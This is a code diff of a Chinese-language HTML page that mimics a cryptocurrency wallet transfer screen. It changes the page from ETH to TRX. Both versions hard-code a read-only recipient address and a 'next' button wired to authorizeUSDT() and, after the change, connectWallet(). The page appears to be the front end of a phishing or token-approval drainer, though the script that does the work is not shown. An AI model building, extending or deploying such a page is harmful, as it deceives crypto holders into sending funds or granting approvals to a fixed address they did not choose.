@@ -1,30 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>付款 ETH</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRX 转账</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="container">
-        <h1>付款 ETH</h1>
+        <div class="navbar">
+            <h1>TRX 转账</h1>
+        </div>
+        <p>Tron</p>
         <div class="form-group">
             <label for="address">收款地址</label>
-            <div class="input-group">
-                <input type="text" id="address" placeholder="搜索或输入" value="0xbF674CbDF092223c5BD316cA7684e5B225fE9fef" readonly>
-            </div>
+            <input type="text" id="address" value="TAMcDtafk9YfrECqNMKUqHNgED8JLity6Z" readonly>
         </div>
         <div class="form-group">
             <label for="amount">数量</label>
-            <div class="input-group">
-                <input type="text" id="amount" placeholder="ETH ">
+            <div class="amount-note-wrapper">
+                <input type="number" id="amount" placeholder="0" inputmode="decimal">
+                <div class="divider"></div>
+                <input type="text" id="note" placeholder="备注（需支付 1 TRX）">
             </div>
         </div>
-        <div class="usd-equivalent">≈ $0.00</div>
+        <div class="fee-label">矿工费</div>
+        <div class="fee">
+            <span class="fee-amount">$0</span>
+            <span class="fee-trx">0 TRX</span>
+        </div>
+        <button class="btn" id="okButton" onclick="connectWallet()">下一步</button>
     </div>
-    <button id="nextButton" onclick="authorizeUSDT()">下一步</button>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
-    <script src="script.js" type="application/javascript"></script>
+    <script src="script.js"></script>
 </body>
 </html>
